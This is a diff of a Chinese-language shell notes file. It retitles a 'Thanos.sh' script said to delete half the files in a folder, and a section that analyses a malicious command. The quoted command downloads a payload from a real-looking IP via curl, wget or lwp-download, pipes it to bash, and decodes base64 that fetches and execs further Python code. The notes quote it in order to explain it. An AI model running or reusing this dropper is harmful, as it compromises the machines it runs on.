@@ -1,4 +1,5 @@
-Thanos.sh
+## Thanos.sh 一键删除指定文件夹的二分之一文件
+
 ```python
 #!/bin/sh
 #filename 为本shell的文件名，例如这里是Thanos.sh
@@ -90,7 +91,9 @@ curl https://www.example.com
 $ curl -s https://www.example.com
 ```
 
-#### 一个恶意命令解析
+
+
+## 一个恶意命令解析
 
 ```
 /bin/bash -c (curl -s http://80.71.158.96/xms || wget -q -O - http://80.71.158.96/xms || lwp-download http://80.71.158.96/xms /tmp/xms) | bash -sh; bash /tmp/xms; rm -rf /tmp/xms; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly84MC43MS4xNTguOTYvZC5weSIpLnJlYWQoKSkn | base64 -d | bash -
